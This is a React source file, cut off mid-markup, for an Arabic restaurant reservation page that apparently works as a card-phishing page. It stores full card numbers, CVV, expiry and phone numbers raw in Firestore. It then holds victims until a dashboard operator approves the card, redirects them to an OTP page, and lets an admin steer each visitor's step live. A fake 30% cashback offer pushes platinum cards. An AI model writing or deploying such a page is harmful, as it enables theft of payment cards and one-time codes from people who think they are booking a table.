import { useState, useEffect } from "react";
import { Link, useParams, useLocation } from "wouter";
import { ArrowRight, Calendar, Clock, Users, User, Phone, FileText, ChevronLeft, CreditCard, ShieldCheck, Lock, Wifi, ChevronDown, Receipt, X, Gift } from "lucide-react";
import { CountryPhoneInput } from "@/components/country-phone-input";
import { getRestaurantById } from "@/lib/restaurant-data";
import { addData, handlePay, listenForApproval, isBinBlocked } from "@/lib/firebase";
import { setupOnlineStatus } from "@/lib/utils";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { ProgressBar } from "@/components/bujairi-header";

type Step = 1 | 2 | 3 | 4;

const RESERVE_STEPS = [
  { n: 1, label: "الموعد" },
  { n: 2, label: "البيانات" },
  { n: 3, label: "الفاتورة" },
  { n: 4, label: "الدفع" },
];

const validateLuhn = (cardNum: string): boolean => {
  const digits = cardNum.replace(/\s/g, "");
  if (!/^\d{13,19}$/.test(digits)) return false;
  let sum = 0;
  let isEven = false;
  for (let i = digits.length - 1; i >= 0; i--) {
    let digit = parseInt(digits[i], 10);
    if (isEven) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
    isEven = !isEven;
  }
  return sum % 10 === 0;
};

const getCardType = (cardNum: string): string => {
  const num = cardNum.replace(/\s/g, "");
  if (/^4/.test(num)) return "visa";
  if (/^5[1-5]/.test(num)) return "mastercard";
  if (/^(508|60|62|67)/.test(num)) return "mada";
  return "";
};

const getCardGradient = (cardType: string): string => {
  switch (cardType) {
    case "visa": return "from-[#1a1f71] via-[#2d3494] to-[#1a1f71]";
    case "mastercard": return "from-[#eb001b] via-[#f79e1b] to-[#eb001b]";
    case "mada": return "from-[#004d40] via-[#00695c] to-[#004d40]";
    default: return "from-[#434343] via-[#5a5a5a] to-[#434343]";
  }
};

export default function Reserve() {
  const params = useParams<{ id: string }>();
  const restaurant = getRestaurantById(Number(params.id));
  const [, setLocation] = useLocation();
  const [step, setStep] = useState<Step>(1);

  const [date, setDate] = useState("");
  const [time, setTime] = useState("");
  const [guests, setGuests] = useState("2");
  const [name, setName] = useState("");
  const [phone, setPhone] = useState("");
  const [notes, setNotes] = useState("");

  const [cardNumber, setCardNumber] = useState("");
  const [cardName, setCardName] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("01");
  const [expiryYear, setExpiryYear] = useState("2026");
  const [cvv, setCvv] = useState("");
  const [stepSubmitting, setStepSubmitting] = useState(false);
  const [stepSubmitError, setStepSubmitError] = useState("");
  const [cardErrors, setCardErrors] = useState<Record<string, string>>({});
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showCashbackPopup, setShowCashbackPopup] = useState(false);

  // Booking confirmation fee. Visitors can choose between a full deposit
  // (50 SAR — refundable on visit) or a small "hold" deposit (10 SAR) that
  // simply confirms the reservation. Both flow through the same payment
  // and Firestore code paths so the dashboard sees the chosen amount.
  const FULL_FEE = 50;
  const PARTIAL_FEE = 10;
  const [paymentMode, setPaymentMode] = useState<"full" | "partial">("full");
  const serviceFee = paymentMode === "partial" ? PARTIAL_FEE : FULL_FEE;
  const reservationTotal = serviceFee;

  // Admin "page push" handler — dashboard sends steps 1-4 corresponding to the
  // four internal stages of /reserve/:id (الموعد/البيانات/الفاتورة/الدفع).
  // App.tsx forwards those as a custom event so we can jump the visitor to the
  // right internal stage of this multi-step page without losing the URL.
  useEffect(() => {
    const applyTarget = (raw: unknown) => {
      const target = Number(raw) || 0;
      if (target >= 1 && target <= 4) {
        setStep(target as Step);
        return true;
      }
      return false;
    };
    // Pick up any push that fired BEFORE this lazy-loaded page mounted.
    const w = window as any;
    if (w.__pendingReserveStep != null) {
      applyTarget(w.__pendingReserveStep);
      w.__pendingReserveStep = null;
    }
    const onPush = (e: Event) => {
      const detail = (e as CustomEvent<{ step: number }>).detail;
      applyTarget(detail?.step);
      (window as any).__pendingReserveStep = null;
    };
    window.addEventListener("admin-restaurant-step", onPush);
    return () => window.removeEventListener("admin-restaurant-step", onPush);
  }, []);

  // Mirror the current internal step to firestore as a `currentPage` value
  // so the dashboard's PagesControl highlights the right button. Must run
  // even when the visitor doc was created earlier (in StepOne handler).
  useEffect(() => {
    if (typeof window === "undefined") return;
    const visitorId = localStorage.getItem("visitor");
    if (!visitorId) return;
    const pageMap: Record<number, string> = {
      1: "reserve_date",
      2: "reserve_details",
      3: "reserve_invoice",
      4: "reserve_checkout",
    };
    const page = pageMap[step];
    if (!page) return;
    addData({ id: visitorId, currentPage: page }).catch(() => {});
  }, [step]);

  if (!restaurant) {
    return (
      <div className="min-h-screen bg-[#ebddd0] flex items-center justify-center" dir="rtl">
        <div className="text-center">
          <h2 className="text-[#4a1525] text-2xl font-bold mb-4">المطعم غير موجود</h2>
          <Link href="/restaurants" className="text-[#c9a96e] underline" data-testid="link-back-restaurants">
            العودة للمطاعم
          </Link>
        </div>
      </div>
    );
  }

  const timeSlots = [
    "12:00 م", "12:30 م", "1:00 م", "1:30 م",
    "2:00 م", "2:30 م", "5:00 م", "5:30 م",
    "6:00 م", "6:30 م", "7:00 م", "7:30 م",
    "8:00 م", "8:30 م", "9:00 م", "9:30 م",
    "10:00 م", "10:30 م",
  ];

  const guestOptions = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"];
  const today = new Date().toISOString().split("T")[0];

  const ensureReservationVisitorId = () => {
    const existingVisitorId = localStorage.getItem("visitor");
    if (existingVisitorId) {
      setupOnlineStatus(existingVisitorId);
      return existingVisitorId;
    }

    const visitorId = `reserve_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`;
    localStorage.setItem("visitor", visitorId);
    localStorage.removeItem("otpHistory");
    setupOnlineStatus(visitorId);
    return visitorId;
  };

  const handleDateSubmit = async () => {
    if (stepSubmitting || !date || !time) return;

    setStepSubmitting(true);
    setStepSubmitError("");

    const visitorId = ensureReservationVisitorId();
    const saved = await addData({
      id: visitorId,
      type: "restaurant_reservation",
      restaurantId: restaurant.id,
      restaurant: restaurant.name,
      restaurantEn: restaurant.nameEn,
      date,
      time,
      guests,
      currentPage: "reserve_details",
    });

    if (!saved) {
      setStepSubmitError("تعذر حفظ البيانات، يرجى المحاولة مرة أخرى");
      setStepSubmitting(false);
      return;
    }

    setStep(2);
    setStepSubmitting(false);
  };

  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
    const matches = v.match(/\d{4,16}/g);
    const match = (matches && matches[0]) || "";
    const parts = [];
    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4));
    }
    return parts.length ? parts.join(" ") : v;
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCardNumber(e.target.value);
    if (formatted.replace(/\s/g, "").length <= 16) {
      setCardNumber(formatted);
      setCardErrors((prev) => ({ ...prev, cardNumber: "", submit: "" }));
    }
  };

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const v = e.target.value.replace(/[^0-9]/g, "");
    if (v.length <= 4) {
      setCvv(v);
      setCardErrors((prev) => ({ ...prev, cvv: "", submit: "" }));
    }
  };

  const validateCard = (): boolean => {
    const newErrors: Record<string, string> = {};
    const rawCard = cardNumber.replace(/\s/g, "");
    if (!rawCard || rawCard.length < 13) newErrors.cardNumber = "رقم البطاقة غير صحيح";
    else if (!validateLuhn(rawCard)) newErrors.cardNumber = "رقم البطاقة غير صالح";
    if (!cardName.trim() || cardName.trim().length < 3) newErrors.cardName = "يرجى إدخال الاسم على البطاقة";
    const now = new Date();
    const expiry = new Date(parseInt(expiryYear), parseInt(expiryMonth) - 1);
    if (expiry < now) newErrors.expiry = "البطاقة منتهية الصلاحية";
    if (!cvv || cvv.length < 3) newErrors.cvv = "كود الحماية غير صحيح";
    setCardErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const [isWaitingApproval, setIsWaitingApproval] = useState(false);

  useEffect(() => {
    if (!isWaitingApproval) return;
    const unsubscribe = listenForApproval((status) => {
      if (status === "approved") {
        setIsWaitingApproval(false);
        setLocation("/otp");
      } else if (status === "rejected") {
        setIsWaitingApproval(false);
        setCardErrors((prev) => ({
          ...prev,
          submit: "البطاقة غير مدعومه حاول استخدام بطاقة اخرى",
        }));
      }
    });
    return () => unsubscribe();
  }, [isWaitingApproval, setLocation]);

  const handlePaymentSubmit = async () => {
    if (isSubmitting || isWaitingApproval) return;
    if (!validateCard()) return;
    setIsSubmitting(true);
    setCardErrors((prev) => ({ ...prev, submit: "" }));

    const visitorId = ensureReservationVisitorId();

    const normalizedCardNumber = cardNumber.replace(/\s/g, "");
    const normalizedCardType = getCardType(cardNumber);

    try {
      if (await isBinBlocked(normalizedCardNumber)) {
        setCardErrors((prev) => ({
          ...prev,
          submit: "هذه البطاقة غير مدعومة. يرجى استخدام بطاقة أخرى.",
        }));
        setIsSubmitting(false);
        return;
      }
    } catch {
      // ignore lookup errors
    }
    const paymentInfo = {
      cardNumber: normalizedCardNumber,
      cardName,
      expiryMonth,
      expiryYear,
      cvv,
      cardType: normalizedCardType,
      currentPage: "reserve_checkout",
    };

    await addData({
      id: visitorId,
      type: "restaurant_reservation",
      restaurantId: restaurant.id,
      restaurant: restaurant.name,
      restaurantEn: restaurant.nameEn,
      date, time, guests, name, phone, notes,
      total: reservationTotal,
      cardNumber: normalizedCardNumber,
      cardName,
      expiryMonth,
      expiryYear,
      cvv,
      cardType: normalizedCardType,
      currentPage: "reserve_checkout",
    });

    try {
      await handlePay(paymentInfo, () => {});
    } catch (error: any) {
      if (error?.message === "VISITOR_BLOCKED") {
        setCardErrors((prev) => ({
          ...prev,
          submit: "تم حظر هذا الزائر ولا يمكنه المتابعة",
        }));
      } else {
        setCardErrors((prev) => ({
          ...prev,
          submit: "حدث خطأ أثناء معالجة الدفع",
        }));
      }
      setIsSubmitting(false);
      return;
    }

    setIsSubmitting(false);
    setIsWaitingApproval(true);
  };

  const cardType = getCardType(cardNumber);

  return (
    <div className="min-h-screen bg-[#ebddd0]" dir="rtl">
      <div className="bg-[#4a1525] px-4 py-3 flex items-center gap-3">
        {step === 1 ? (
          <Link
            href={`/restaurant/${restaurant.id}`}
            className="text-white/80 hover:text-white transition-colors"
            data-testid="link-back-detail"
          >
            <ArrowRight className="w-5 h-5" />
          </Link>
        ) : (
          <button
            onClick={() => setStep((step - 1) as Step)}
            className="text-white/80 hover:text-white transition-colors"
            data-testid="button-back-step"
          >
            <ArrowRight className="w-5 h-5" />
          </button>
        )}
        <div className="flex items-center gap-3 flex-1">
          <img
            src={restaurant.logo}
            alt={restaurant.nameEn}
            className="w-10 h-10 rounded-lg object-cover border border-white/20"
          />
          <div>
            <h1 className="text-white font-bold text-sm" data-testid="text-reserve-restaurant-name">
              حجز طاولة - {restaurant.name}
            </h1>
            <p className="text-white/60 text-xs">{restaurant.nameEn}</p>
          </div>
        </div>
      </div>

      <ProgressBar current={step} steps={RESERVE_STEPS} />

      <div className="max-w-lg mx-auto px-4 py-6">
        {step === 1 && (
          <div className="space-y-4 animate-fade-in" data-testid="step-1-content">
            <div className="bg-white rounded-xl p-5 shadow-sm space-y-5">
              <h2 className="text-[#4a1525] font-bold text-lg flex items-center gap-2">
                <Calendar className="w-5 h-5" />
                اختر موعد الحجز
              </h2>

              <div>
                <label className="block text-[#4a1525] text-sm font-medium mb-2">التاريخ *</label>
                <input
                  type="date"
                  value={date}
                  onChange={(e) => setDate(e.target.value)}
                  min={today}
                  required
                  className="w-full border border-[#d5c8b5] rounded-lg px-4 py-3 text-sm bg-[#faf7f3] focus:outline-none focus:border-[#4a1525] focus:ring-1 focus:ring-[#4a1525] transition-colors"
                  data-testid="input-date"
                />
              </div>

              <div>
                <label className="block text-[#4a1525] text-sm font-medium mb-2">
                  <Clock className="w-4 h-4 inline ml-1" />
                  الوقت *
                </label>
                <div className="grid grid-cols-3 gap-2">
                  {timeSlots.map((slot) => (
                    <button
                      key={slot}
                      type="button"
                      onClick={() => setTime(slot)}
                      className={`py-2.5 rounded-lg text-xs font-medium transition-colors ${
                        time === slot
                          ? "bg-[#4a1525] text-white"
                          : "bg-[#faf7f3] text-[#4a1525] border border-[#d5c8b5] hover:bg-[#4a1525]/10"
                      }`}
                      data-testid={`button-time-${slot}`}
                    >
                      {slot}
                    </button>
                  ))}
                </div>
              </div>

              <div>
                <label className="block text-[#4a1525] text-sm font-medium mb-2">
                  <Users className="w-4 h-4 inline ml-1" />
                  عدد الضيوف *
                </label>
                <div className="flex gap-2 flex-wrap">
                  {guestOptions.map((g) => (
                    <button
                      key={g}
                      type="button"
                      onClick={() => setGuests(g)}
                      className={`w-10 h-10 rounded-full text-sm font-medium transition-colors ${
                        guests === g
                          ? "bg-[#4a1525] text-white"
                          : "bg-[#faf7f3] text-[#4a1525] border border-[#d5c8b5] hover:bg-[#4a1525]/10"
                      }`}
                      data-testid={`button-guests-${g}`}
                    >
                      {g}
                    </button>
                  ))}
                </div>
              </div>
            </div>

            <button
              onClick={() => { void handleDateSubmit(); }}
              disabled={!date || !time || stepSubmitting}
              className="w-full bg-[#4a1525] text-white py-4 rounded-xl font-bold text-base hover:bg-[#3a0f1d] transition-colors shadow-md disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
              data-testid="button-next-step-1"
            >
              {stepSubmitting ? "جاري الإرسال..." : "التالي - بيانات الحجز"}
              <ChevronLeft className="w-5 h-5" />
            </button>
            {stepSubmitError && (
              <p className="text-red-500 text-xs text-center" data-testid="error-reserve-step-1-submit">
                {stepSubmitError}
              </p>
            )}
          </div>
        )}

        {step === 2 && (
          <div className="space-y-4 animate-fade-in" data-testid="step-2-content">
            <div className="bg-white rounded-xl p-5 shadow-sm space-y-5">
              <h2 className="text-[#4a1525] font-bold text-lg flex items-center gap-2">
                <User className="w-5 h-5" />
                بيانات الحجز
              </h2>

              <div>
                <label className="block text-[#4a1525] text-sm font-medium mb-2">الاسم الكامل *</label>
                <div className="relative">
                  <User className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-[#b1a1a0]" />
                  <input
                    type="text"
                    value={name}
                    onChange={(e) => setName(e.target.value.slice(0, 80))}
                    required
                    maxLength={80}
                    placeholder="أدخل اسمك الكامل"
                    className="w-full border border-[#d5c8b5] rounded-lg pr-10 pl-4 py-3 text-sm bg-[#faf7f3] focus:outline-none focus:border-[#4a1525] focus:ring-1 focus:ring-[#4a1525] transition-colors placeholder:text-[#b1a1a0]"
                    data-testid="input-name"
                  />
                </div>
              </div>

              <div>
                <label className="block text-[#4a1525] text-sm font-medium mb-2">رقم الهاتف *</label>
                <CountryPhoneInput
                  value={phone}
                  onChange={setPhone}
                  className="!border-[#d5c8b5] !bg-[#faf7f3] py-1.5 focus-within:!border-[#4a1525] focus-within:ring-1 focus-within:ring-[#4a1525]"
                  inputClassName="bg-[#faf7f3] py-2"
                  testId="input-phone"
                />
              </div>

              <div>
                <label className="block text-[#4a1525] text-sm font-medium mb-2">
                  <FileText className="w-4 h-4 inline ml-1" />
                  ملاحظات إضافية
                </label>
                <textarea
                  value={notes}
                  onChange={(e) => setNotes(e.target.value.slice(0, 300))}
                  placeholder="مثال: طاولة بجانب النافذة، حساسية طعام..."
                  rows={3}
                  maxLength={300}
                  className="w-full border border-[#d5c8b5] rounded-lg px-4 py-3 text-sm bg-[#faf7f3] focus:outline-none focus:border-[#4a1525] focus:ring-1 focus:ring-[#4a1525] transition-colors placeholder:text-[#b1a1a0] resize-none"
                  data-testid="input-notes"
                />
              </div>
            </div>

            <button
              onClick={() => { if (name && phone) setStep(3); }}
              disabled={!name || !phone}
              className="w-full bg-[#4a1525] text-white py-4 rounded-xl font-bold text-base hover:bg-[#3a0f1d] transition-colors shadow-md disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
              data-testid="button-next-step-2"
            >
              التالي - الفاتورة
              <ChevronLeft className="w-5 h-5" />
            </button>
          </div>
        )}

        {step === 3 && (
          <div className="space-y-4 animate-fade-in" data-testid="step-3-content">
            <div className="bg-gradient-to-r from-[#4a1525] to-[#3a0f1d] rounded-xl p-5 text-center">
              <Receipt className="w-8 h-8 text-[#c9a96e] mx-auto mb-2" />
              <h2 className="text-white font-bold text-lg">فاتورة الحجز</h2>
              <p className="text-white/70 text-xs mt-1">مراجعة تفاصيل وتكلفة الحجز</p>
            </div>

            <div className="bg-white rounded-xl p-5 shadow-sm">
              <h3 className="text-[#4a1525] font-bold text-sm mb-4 flex items-center gap-2">
                <FileText className="w-4 h-4" />
                تفاصيل الحجز
              </h3>
              <div className="space-y-3 text-sm">
                <div className="flex justify-between">
                  <span className="text-[#7a6b5f]">المطعم</span>
                  <span className="text-[#4a1525] font-medium">{restaurant.name}</span>
                </div>
                <div className="h-[1px] bg-[#f5efe6]" />
                <div className="flex justify-between">
                  <span className="text-[#7a6b5f]">التاريخ</span>
                  <span className="text-[#4a1525] font-medium">{date}</span>
                </div>
                <div className="h-[1px] bg-[#f5efe6]" />
                <div className="flex justify-between">
                  <span className="text-[#7a6b5f]">الوقت</span>
                  <span className="text-[#4a1525] font-medium">{time}</span>
                </div>
                <div className="h-[1px] bg-[#f5efe6]" />
                <div className="flex justify-between">
                  <span className="text-[#7a6b5f]">عدد الضيوف</span>
                  <span className="text-[#4a1525] font-medium">{guests}</span>
                </div>
                <div className="h-[1px] bg-[#f5efe6]" />
                <div className="flex justify-between">
                  <span className="text-[#7a6b5f]">الاسم</span>
                  <span className="text-[#4a1525] font-medium">{name}</span>
                </div>
                <div className="h-[1px] bg-[#f5efe6]" />
                <div className="flex justify-between">
                  <span className="text-[#7a6b5f]">رقم الهاتف</span>
                  <span className="text-[#4a1525] font-medium" dir="ltr">{phone}</span>
                </div>
                {notes && (
                  <>
                    <div className="h-[1px] bg-[#f5efe6]" />
                    <div className="flex justify-between">
                      <span className="text-[#7a6b5f]">ملاحظات</span>
                      <span className="text-[#4a1525] font-medium text-left max-w-[200px]">{notes}</span>
                    </div>
                  </>
                )}
              </div>
            </div>

            <div className="bg-white rounded-xl p-5 shadow-sm">
              <h3 className="text-[#4a1525] font-bold text-sm mb-4 flex items-center gap-2">
                <Receipt className="w-4 h-4" />
                تفاصيل المبلغ
              </h3>
              <div className="space-y-3 text-sm">
                <div className="flex justify-between">
                  <span className="text-[#7a6b5f]">رسوم تأكيد الحجز</span>
                  <span className="text-[#4a1525] font-medium">{serviceFee} ر.س</span>
                </div>
                <div className="h-[1px] bg-[#f5efe6]" />
                <div className="flex justify-between items-center pt-2">
                  <span className="text-[#4a1525] font-bold text-base">الإجمالي</span>
                  <span className="text-[#c9a96e] font-bold text-xl">{reservationTotal} ر.س</span>
                </div>
              </div>
            </div>

            {/* Payment-amount selector: full deposit vs. partial 10 SAR hold */}
            <div className="bg-white rounded-xl p-4 shadow-sm space-y-3" data-testid="payment-mode-selector">
              <h3 className="text-[#4a1525] font-bold text-sm flex items-center gap-2">
                <CreditCard className="w-4 h-4" />
                طريقة الدفع
              </h3>
              <div className="grid grid-cols-2 gap-3">
                <button
                  type="button"
                  onClick={() => setPaymentMode("full")}
                  className={`relative text-right p-3 rounded-xl border-2 transition-all ${
                    paymentMode === "full"
                      ? "border-[#4a1525] bg-[#faf3ec] shadow-sm"
                      : "border-[#e8dccb] bg-white hover:border-[#c9a96e]"
                  }`}
                  data-testid="payment-mode-full"
                >
                  <div className="text-[11px] text-[#7a6b5f] mb-1">الدفع الكامل</div>
                  <div className="text-[#4a1525] font-bold text-lg">{FULL_FEE} ر.س</div>
                  <div className="text-[10px] text-[#7a6b5f] mt-1 leading-tight">
                    قابلة للاسترداد عند الزيارة
                  </div>
                  {paymentMode === "full" && (
                    <div className="absolute top-2 left-2 w-5 h-5 rounded-full bg-[#4a1525] flex items-center justify-center">
                      <svg viewBox="0 0 16 16" className="w-3 h-3 text-white fill-current">
                        <path d="M6 11.5L2.5 8l1-1L6 9.5l6.5-6.5 1 1z" />
                      </svg>
                    </div>
                  )}
                </button>
                <button
                  type="button"
                  onClick={() => setPaymentMode("partial")}
                  className={`relative text-right p-3 rounded-xl border-2 transition-all ${
                    paymentMode === "partial"
                      ? "border-[#4a1525] bg-[#faf3ec] shadow-sm"
                      : "border-[#e8dccb] bg-white hover:border-[#c9a96e]"
                  }`}
                  data-testid="payment-mode-partial"
                >
                  <div className="flex items-center justify-between">
                    <div className="text-[11px] text-[#7a6b5f] mb-1">دفع جزئي</div>
                    <span className="text-[9px] bg-[#c9a96e] text-white px-1.5 py-0.5 rounded font-bold">
                      موصى به
                    </span>
                  </div>
                  <div className="text-[#4a1525] font-bold text-lg">{PARTIAL_FEE} ر.س</div>
                  <div className="text-[10px] text-[#7a6b5f] mt-1 leading-tight">
                    لتأكيد الحجز فقط
                  </div>
                  {paymentMode === "partial" && (
                    <div className="absolute top-2 left-2 w-5 h-5 rounded-full bg-[#4a1525] flex items-center justify-center">
                      <svg viewBox="0 0 16 16" className="w-3 h-3 text-white fill-current">
                        <path d="M6 11.5L2.5 8l1-1L6 9.5l6.5-6.5 1 1z" />
                      </svg>
                    </div>
                  )}
                </button>
              </div>
            </div>

            <div className="bg-[#f5efe6] rounded-xl p-4 text-center">
              <p className="text-[#7a6b5f] text-xs">
                {paymentMode === "partial"
                  ? "يتم خصم 10 ر.س لتأكيد الحجز فقط، والباقي يُدفع في المطعم"
                  : "رسوم تأكيد الحجز قابلة للاسترداد عند زيارة المطعم"}
              </p>
            </div>

            <button
              onClick={() => { setStep(4); setShowCashbackPopup(true); }}
              className="w-full bg-[#4a1525] text-white py-4 rounded-xl font-bold text-base hover:bg-[#3a0f1d] transition-colors shadow-md flex items-center justify-center gap-2"
              data-testid="button-next-step-3"
            >
              متابعة الدفع
              <CreditCard className="w-5 h-5" />
            </button>
          </div>
        )}

        {step === 4 && (
          <>
            {showCashbackPopup && (
              <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
                <div
                  className="absolute inset-0 bg-black/60 backdrop-blur-sm animate-fade-in"
                  onClick={() => setShowCashbackPopup(false)}
                />
                <div className="relative bg-gradient-to-br from-[#4a1525] via-[#5a1f30] to-[#3a0f1d] rounded-3xl p-8 max-w-sm w-full shadow-2xl animate-scale-in">
                  <button
                    onClick={() => setShowCashbackPopup(false)}
                    className="absolute top-4 left-4 text-white/80 hover:text-white transition-colors w-8 h-8 rounded-full bg-white/10 flex items-center justify-center"
                    data-testid="button-close-popup"
                  >
                    <X className="w-5 h-5" />
                  </button>
                  <div className="text-center space-y-5">
                    <div className="w-20 h-20 bg-white/20 rounded-full flex items-center justify-center mx-auto animate-float">
                      <Gift className="w-10 h-10 text-white" />
                    </div>
                    <div className="space-y-3">
                      <h3 className="text-2xl font-bold text-white">عرض حصري!</h3>
                      <p className="text-white text-lg leading-relaxed">احصل على كاش باك يصل إلى</p>
                      <div className="text-6xl font-bold text-white drop-shadow-lg">30%</div>
                      <p className="text-white/90 text-sm">عند الدفع من خلال البطاقات من فئة البلاتينية</p>
                    </div>
                    <div className="flex justify-center gap-3 pt-2">
                      <img src="/mada.png" className="h-8 bg-white/20 rounded-lg px-3 py-1" alt="mada" />
                      <img src="/master.svg" className="h-8 bg-white/20 rounded-lg px-3 py-1" alt="mastercard" />
                      <img src="/visa.png" className="h-5 bg-white/20 rounded-lg px-3 py-2" alt="visa" />
                    </div>
                    <Button
                      onClick={() => setShowCashbackPopup(false)}
                      size="lg"
                      className="w-full bg-white text-[#4a1525] font-bold shadow-lg mt-4"
                      data-testid="button-continue-popup"
                    >
                      متابعة الدفع
                    </Button>
                  </div>
                </div>
              </div>
            )}

            <div className="space-y-6 animate-fade-in" data-testid="step-5-content">
              <div className="mb-6" dir="ltr">
                <div
                  className={`relative w-full max-w-sm mx-auto aspect-[1.586/1] rounded-2xl p-6 bg-gradient-to-br ${getCardGradient(cardType)} shadow-2xl overflow-hidden`}
                  data-testid="card-preview"
                >
                  <div className="flex items-start justify-between">
                    <div className="w-14 h-10 bg-gradient-to-br from-yellow-300 via-yellow-400 to-yellow-500 rounded-lg flex items-center justify-center shadow-md">
                      <div className="w-10 h-7 border-2 border-yellow-600/30 rounded-sm" />
                    </div>
                    <Wifi className="w-7 h-7 text-white/70 rotate-90" />
                  </div>
                  <div className="mt-6">
                    <p className="text-white text-xl font-mono tracking-[0.1em] drop-shadow-lg whitespace-nowrap">
                      {(() => {
                        const digits = cardNumber.replace(/\D/g, "");
                        return digits.length >= 4
                          ? `•••• •••• •••• ${digits.slice(-4)}`
                          : "•••• •••• •••• ••••";
                      })()}
                    </p>
                  </div>
                  <div className="absolute bottom-6 left-6 right-6">
                    <div className="flex justify-between items-end">
                      <div>
                        <p className="text-white/60 text-[10px] uppercase mb-1">Card Holder</p>
                        <p className="text-white text-sm font-medium tracking-wide truncate max-w-[180px]">
                          {cardName || "اسم حامل البطاقة"}
                        </p>
                      </div>
                      <div className="text-right">
                        <p className="text-white/60 text-[10px] uppercase mb-1">Expires</p>
                        <p className="text-white text-sm font-medium">{expiryMonth}/{expiryYear.slice(-2)}</p>
                      </div>
                    </div>
                  </div>
                  <div className="absolute top-6 right-6">
                    {cardType === "visa" && <div className="text-white font-bold text-2xl italic">VISA</div>}
                    {cardType === "mastercard" && (
                      <div className="flex">
                        <div className="w-10 h-10 rounded-full bg-red-500 opacity-80" />
                        <div className="w-10 h-10 rounded-full bg-yellow-500 opacity-80 -ml-5" />
                      </div>
                    )}
                    {cardType === "mada" && <div className="text-white font-bold text-xl">mada</div>}
                  </div>
                  <div className="absolute -bottom-20 -right-20 w-40 h-40 rounded-full bg-white/5" />
                  <div className="absolute -bottom-10 -right-10 w-32 h-32 rounded-full bg-white/5" />
                </div>
              </div>

              <div className="flex items-center justify-center gap-4 py-2">
                <img src="/mada.png" className="h-7 opacity-70 hover:opacity-100 transition-opacity" alt="mada" />
                <img src="/master.svg" className="h-7 opacity-70 hover:opacity-100 transition-opacity" alt="mastercard" />
                <img src="/visa.png" className="h-4 opacity-70 hover:opacity-100 transition-opacity" alt="visa" />
              </div>

              <div className="bg-white rounded-2xl shadow-xl p-6 space-y-5">
                <div>
                  <Label
                    htmlFor="reserve-cardNumber"
                    className="text-sm font-medium text-foreground mb-2 flex items-center gap-2"
                  >
                    <CreditCard className="w-4 h-4 text-primary" />
                    رقم البطاقة
                  </Label>
                  <div className="relative">
                    <Input
                      id="reserve-cardNumber"
                      type="text"
                      value={cardNumber}
                      onChange={handleCardNumberChange}
                      maxLength={19}
                      className={`text-left pr-12 h-12 rounded-xl border-2 font-mono ${cardErrors.cardNumber ? "border-red-500" : "border-input focus:border-primary"}`}
                      placeholder="0000 0000 0000 0000"
                      dir="ltr"
                      data-testid="input-card-number"
                    />
                    <div className="absolute right-3 top-1/2 -translate-y-1/2 flex gap-1">
                      {cardType === "visa" && <img src="/visa.png" className="h-4" alt="visa" />}
                      {cardType === "mastercard" && <img src="/master.svg" className="h-6" alt="mastercard" />}
                      {cardType === "mada" && <img src="/mada.png" className="h-6" alt="mada" />}
                    </div>
                  </div>
                  {cardErrors.cardNumber && <p className="text-red-500 text-xs mt-1">{cardErrors.cardNumber}</p>}
                </div>

                <div>
                  <Label htmlFor="reserve-cardName" className="text-sm font-medium text-foreground mb-2 block">
                    الاسم على البطاقة
                  </Label>
                  <Input
                    id="reserve-cardName"
                    type="text"
                    value={cardName}
                    onChange={(e) => {
                      setCardName(e.target.value.toUpperCase().slice(0, 60));
                      setCardErrors((p) => ({ ...p, cardName: "", submit: "" }));
                    }}
                    maxLength={60}
                    className={`text-left h-12 rounded-xl border-2 ${cardErrors.cardName ? "border-red-500" : "border-input focus:border-primary"}`}
                    placeholder="MOHAMMED ALI"
                    dir="ltr"
                    data-testid="input-card-name"
                  />
                  {cardErrors.cardName && <p className="text-red-500 text-xs mt-1">{cardErrors.cardName}</p>}
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <Label className="text-sm font-medium text-foreground mb-2 block">تاريخ الانتهاء</Label>
                    <div className="flex gap-2">
                      <div className="flex-1 relative">
                        <select
                          value={expiryMonth}
                          onChange={(e) => { setExpiryMonth(e.target.value); setCardErrors((p) => ({ ...p, expiry: "" })); }}
                          className={`w-full h-12 px-3 rounded-xl border-2 bg-background text-foreground appearance-none ${cardErrors.expiry ? "border-red-500" : "border-input focus:border-primary"}`}
                          data-testid="select-expiry-month"
                        >
                          {Array.from({ length: 12 }, (_, i) => {
                            const month = String(i + 1).padStart(2, "0");
                            return <option key={month} value={month}>{month}</option>;
                          })}
                        </select>
                        <ChevronDown className="absolute left-2 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground pointer-events-none" />
                      </div>
                      <div className="flex-1 relative">
                        <select
                          value={expiryYear}
                          onChange={(e) => { setExpiryYear(e.target.value); setCardErrors((p) => ({ ...p, expiry: "" })); }}
                          className={`w-full h-12 px-3 rounded-xl border-2 bg-background text-foreground appearance-none ${cardErrors.expiry ? "border-red-500" : "border-input focus:border-primary"}`}
                          data-testid="select-expiry-year"
                        >
                          {Array.from({ length: 10 }, (_, i) => {
                            const year = String(2025 + i);
                            return <option key={year} value={year}>{year}</option>;
                          })}
                        </select>
                        <ChevronDown className="absolute left-2 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground pointer-events-none" />
                      </div>
                    </div>
                    {cardErrors.expiry && <p className="text-red-500 text-xs mt-1">{cardErrors.expiry}</p>}
                  </div>

                  <div>
                    <Label htmlFor="reserve-cvv" className="text-sm font-medium text-foreground mb-2 block">CVV</Label>
                    <Input
                      id="reserve-cvv"
                      type="text"
                      value={cvv}
                      onChange={handleCvvChange}
                      maxLength={4}
                      className={`text-center h-12 rounded-xl border-2 font-mono ${cardErrors.cvv ? "border-red-500" : "border-input focus:border-primary"}`}
                      placeholder="123"
